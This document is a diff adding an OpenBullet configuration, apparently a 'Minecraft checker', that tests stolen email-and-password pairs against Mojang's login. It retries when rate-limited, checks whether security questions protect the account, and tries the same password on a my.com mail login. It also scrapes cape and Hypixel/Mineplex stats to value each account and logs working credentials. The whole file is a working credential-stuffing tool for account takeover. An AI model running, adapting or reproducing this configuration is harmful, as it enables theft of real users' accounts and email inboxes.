@@ -1,0 +1,237 @@
+# REQUEST POST "https://authserver.mojang.com/authenticate" 
+  CONTENT "{\"agent\":{\"name\":\"Minecraft\",\"version\":1},\"username\":\"<USER>\",\"password\":\"<PASS>\",\"requestUser\":true}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+# KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "\"accessToken\":" 
+  KEYCHAIN Failure OR 
+    KEY "Invalid credentials. Invalid username or password" 
+  KEYCHAIN Failure OR 
+    KEY "Unexpected character " 
+  KEYCHAIN Ban OR 
+    KEY "403 ERROR</H1>" 
+
+IF "<SOURCE>" Contains "Client sent too many requests too fast"
+
+# FUNCTION Delay "5000" 
+
+SET STATUS RETRY
+ELSE
+
+# PARSE "<SOURCE>" LR "" "" CreateEmpty=FALSE -> CAP "RESPONCE" 
+
+# PARSE "<SOURCE>" LR "\"name\":\"" "\"" -> VAR "Name" 
+
+# PARSE "<SOURCE>" LR "\"accessToken\":\"" "\"" -> VAR "TOKEN" 
+
+# REQUEST GET "https://api.mojang.com/user/security/challenges" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Bearer <TOKEN>" 
+
+IF "<SOURCE>" Contains "},\"question\":{\"id\":"
+
+# PARSE "" LR "" "" -> VAR "NFA" "[NFA +]" "" 
+
+# PARSE "" LR "" "" -> VAR "SFA" "[SFA -]" "" 
+
+ELSE
+
+# PARSE "" LR "" "" -> VAR "NFA" "[NFA -]" "" 
+
+# PARSE "" LR "" "" -> VAR "SFA" "[SFA +]" "" 
+
+ENDIF
+
+# REQUEST GET "https://aj-https.my.com/cgi-bin/auth?timezone=GMT%2B2&reqmode=fg&ajax_call=1&udid=16cbef29939532331560e4eafea6b95790a743e9&device_type=Tablet&mp=iOS%C2%A4t=MyCom&mmp=mail&os=iOS&md5_signature=6ae1accb78a8b268728443cba650708e&os_version=9.2&model=iPad%202%3B%28WiFi%29&simple=1&Login=<USER>&ver=4.2.0.12436&DeviceID=D3E34155-21B4-49C6-ABCD-FD48BB02560D&country=GB&language=fr_FR&LoginType=Direct&Lang=en_FR&Password=<PASS>&device_vendor=Apple&mob_json=1&DeviceInfo=%7B%22Timezone%22%3A%22GMT%2B2%22%2C%22OS%22%3A%22iOS%209.2%22%2C?%22AppVersion%22%3A%224.2.0.12436%22%2C%22DeviceName%22%3A%22iPad%22%2C%22Device?%22%3A%22Apple%20iPad%202%3B%28WiFi%29%22%7D&device_name=iPad&" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "Ok=0"
+
+# PARSE "" LR "" "" -> VAR "MFA" "[MFA -]" "" 
+
+ELSE
+
+# PARSE "" LR "" "" -> VAR "MFA" "[MFA +]" "" 
+
+ENDIF
+
+# REQUEST POST "https://capemc.net/" 
+  CONTENT "username=<Name>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "This Player has no Labymod Cape"
+
+# PARSE "" LR "" "" -> VAR "LC" "[Labymod Cape: -]" "" 
+
+ELSE
+IF "<SOURCE>" Contains "This Player doesn't exist"
+
+# PARSE "" LR "" "" -> VAR "LC" "[Labymod Cape: -]" "" 
+
+ELSE
+
+# PARSE "" LR "" "" -> VAR "LC" "[Labymod Cape: +]" "" 
+
+ENDIF
+ENDIF
+
+# REQUEST GET "http://s.optifine.net/capes/<Name>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "Not found"
+
+# PARSE "" LR "" "" -> VAR "OP_C_1" "[OP_1 Cape: -]" "" 
+
+ELSE
+
+# PARSE "" LR "" "" -> VAR "OP_C_1" "[OP_1 Cape: +]" "" 
+
+ENDIF
+
+# REQUEST GET "https://minecraft.technology/Optifine" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+# PARSE "<SOURCE>" LR "<input name=\"__RequestVerificationToken\" type=\"hidden\" value=\"" "\" /></form>" -> VAR "OP_TOKEN" 
+
+# REQUEST POST "https://minecraft.technology/Optifine" 
+  CONTENT "accounts=<Name>&__RequestVerificationToken=<OP_TOKEN>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+# PARSE "<SOURCE>" LR "<div class=\"tab-pane active\" id=\"tab_1-1\">" "</div>" -> VAR "OP_CAP_2" 
+
+IF "<OP_CAP_2>" Contains "<Name>"
+
+# PARSE "" LR "" "" -> VAR "OP_CAPE_2" "[OP_2 Cape: +]" "" 
+
+ELSE
+
+# PARSE "" LR "" "" -> VAR "OP_CAPE_2" "[OP_2 Cape: -]" "" 
+
+END
+
+# REQUEST GET "https://namemc.com/profile/<Name>.1" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+# PARSE "<SOURCE>" LR "<div class=\"col      order-md-1 col-md-4\"><strong class=\"d-inline d-md-none\">UUID</strong></div>" "</a></div>" CreateEmpty=FALSE -> VAR "UUID2" 
+
+# PARSE "<UUID2>" LR "<div class=\"col-auto order-md-3 col-md-auto text-nowrap text-right\"><a class=\"copy-button\" href=\"javascript:void(0)\" data-clipboard-text=\"" "\" onclick=\"return false\">Copy" CreateEmpty=FALSE -> VAR "UUID" 
+
+# REQUEST GET "https://minecraftcapes.net/user/<UUID>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+# PARSE "<SOURCE>" LR "<th scope=\"row\">Cape</th>" "</tr>" -> VAR "MOP_CAPE" 
+
+# PARSE "<SOURCE>" LR "<th scope=\"row\">Ears</th>" "</tr>" -> VAR "M_EARS" 
+
+IF "<MOP_CAPE>" Contains "text-danger"
+
+# PARSE "" LR "" "" -> VAR "MOPC" "[Mojang Or OP Cape: -]" "" 
+
+ELSE
+
+# PARSE "" LR "" "" -> VAR "MOPC" "[Mojang Or OP Cape: +]" "" 
+
+ENDIF
+IF "<M_EARS>" Contains "text-danger"
+
+# PARSE "" LR "" "" -> VAR "MEARS" "[Mojang Ears: -]" "" 
+
+ELSE
+
+# PARSE "" LR "" "" -> VAR "MEARS" "[Mojang Ears: +]" "" 
+
+ENDIF
+
+# PARSE "" LR "" "" -> VAR "CAPES" "[Capes ETC: <MEARS>, <MOPC>, <OP_CAPE_2>, <OP_C_1>, <LC>]" "" 
+
+# PARSE "" LR "" "" -> VAR "ACCOUNT" "[Account: <NFA>, <SFA>, <MFA>]" "" 
+
+# REQUEST GET "http://mineplex.com/players/<Name>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "That player cannot be found."
+
+# PARSE "" LR "" "" -> VAR "M_1" "[Mineplex Login -]" "" 
+
+ELSE
+
+# PARSE "" LR "" "" -> VAR "M_2" "[Mineplex Login +]" "" 
+
+# PARSE "<SOURCE>" LR "</b>&nbsp;&nbsp;&nbsp;<progress max=\"100\" value=\"" "\"></progress>" -> VAR "M_3" "[Mineplex Level: " "]" 
+
+# PARSE "<SOURCE>" LR "<p style=\"background-color: #e6e6e6; padding: 5px;\"><span style=\"font-weight: bold;\">EXP Earned</span><span style=\"float: right;\">" "</span></p>" -> VAR "M_4" "[Mineplex Total EXP: " "]" 
+
+# PARSE "<SOURCE>" LR "<p style=\"padding: 5px;\"><span style=\"font-weight: bold;\">Games Played</span><span style=\"float: right;\">" "</span></p>" -> VAR "M_5" "[Mineplex Total Game Played: " "]" 
+
+# PARSE "<SOURCE>" LR "<p style=\"background-color: #e6e6e6; padding: 5px;     border-radius: 0 0 10px 10px;\"><span style=\"font-weight: bold;\">Friends</span><span style=\"float: right;\">" "</span></p>" -> VAR "M_6" "[Mineplex Total Friends: " "]" 
+
+# PARSE "" LR "" "" -> VAR "M_1" "[Mineplex Data: <M_2>, <M_3>, <M_4>, <M_5>, <M_6>, [Link: https://www.mineplex.com/players/<Name>]]" "" 
+
+ENDIF
+
+# REQUEST GET "https://plancke.io/hypixel/player/stats/<Name>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+IF "<SOURCE>" Contains "Player does not exist!"
+
+# PARSE "" LR "" "" -> VAR "H_1" "[Hypixel Login: -]" "" 
+
+ELSE
+
+# PARSE "" LR "" "" -> VAR "H_2" "[Hypixel Login: +]" "" 
+
+# PARSE "<SOURCE>" LR "<br /><b>Level:</b> " "<br /><b>Karma:</b> " -> VAR "H_3" "[Hypixel Level: " "]" 
+
+# PARSE "<SOURCE>" LR "<br /><b>Karma:</b> " "<br /><b>Achievement Points:</b> " -> VAR "H_4" "[Hypixel Karma : " "]" 
+
+# PARSE "<SOURCE>" LR "<br /><b>Achievement Points:</b> " "<br /><b>Quests Completed:</b> " -> VAR "H_5" "[Hypixel Achievement Points : " "]" 
+
+# PARSE "<SOURCE>" LR "<br /><b>Quests Completed:</b> " "<br /><br /><b>Firstlogin: </b>" -> VAR "H_6" "[Hypixel Total Quests Completed : " "]" 
+
+# PARSE "<SOURCE>" LR "<br /><br /><b>Firstlogin: </b>" "<br /><b>Lastlogin: </b>" -> VAR "H_7" "[Hypixel First Login : " "]" 
+
+# PARSE "<SOURCE>" LR "<br /><b>Lastlogin: </b>" "<br /><br /><b>Friends:</b> <a href=\"/hypixel/player/friends/<Name>\">" -> VAR "H_8" "[Hypixel Last Login : " "]" 
+
+# PARSE "<SOURCE>" LR "<br /><br /><b>Friends:</b> <a href=\"/hypixel/player/friends/<Name>\">" "</a>" -> VAR "H_9" "[Hypixel Last Login : " "]" 
+
+# PARSE "" LR "" "" -> VAR "H_1" "[Hypixel Stats: " "[<H_2>, <H_3>, <H_4>, <H_5>, <H_6>, <H_7>, <H_8>, <H_9>]" 
+
+ENDIF
+
+# PARSE "" LR "" "" CreateEmpty=FALSE -> CAP "LOG" "Sexy Minecraft Checker For Openbullet By Cowrod#1753 | [Mail: <USER>] | [Pass: <PASS>] | [Username: <Name>] | <CAPES> | <ACCOUNT> | <H_1> | <M_1> | [UUID: <UUID>]" "" 
+
+ENDIF
